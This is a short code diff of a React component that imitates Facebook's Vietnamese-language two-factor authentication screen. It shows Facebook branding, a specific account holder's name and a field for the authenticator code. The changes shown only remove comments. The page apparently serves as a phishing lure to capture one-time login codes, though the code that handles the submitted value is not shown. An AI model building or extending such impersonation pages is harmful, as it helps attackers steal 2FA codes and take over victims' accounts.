@@ -28,9 +28,7 @@ const Facebook2FAScreen = () => {
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-gray-100 px-4 py-6 sm:px-6">
       <div className="w-full max-w-md mx-auto">
-        {/* Main Content */}
         <p className="text-[12px] font-medium text-gray-500 break-words">Deante Laroyce • Facebook</p>
-
         <div className="mb-4">
           <h1 className="text-xl sm:text-2xl font-bold text-gray-900">Đi đến ứng dụng xác thực</h1>
           <p className="mt-2 text-xs sm:text-sm text-gray-700">
@@ -49,8 +47,8 @@ const Facebook2FAScreen = () => {
 
         <div className="bg-white rounded-[10px] overflow-hidden mb-4">
           <input
-            type="tel" /* Sử dụng type="tel" để hiển thị bàn phím số trên điện thoại */
-            inputMode="numeric" /* Đảm bảo hiển thị bàn phím số trên điện thoại */
+            type="tel"
+            inputMode="numeric"
             placeholder="Mã"
             className="w-full px-3 sm:px-4 py-3 pr-10 rounded-[10px] border border-gray-300 text-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-base"
             value={code}
@@ -75,7 +73,6 @@ const Facebook2FAScreen = () => {
         </button>
       </div>
 
-      {/* Thêm phần chân trang cho màn hình nhỏ */}
       <div className="mt-6 text-center w-full text-xs text-gray-500">
         <p className="mb-1">© Facebook {new Date().getFullYear()}</p>
         <div className="flex justify-center space-x-3 flex-wrap">
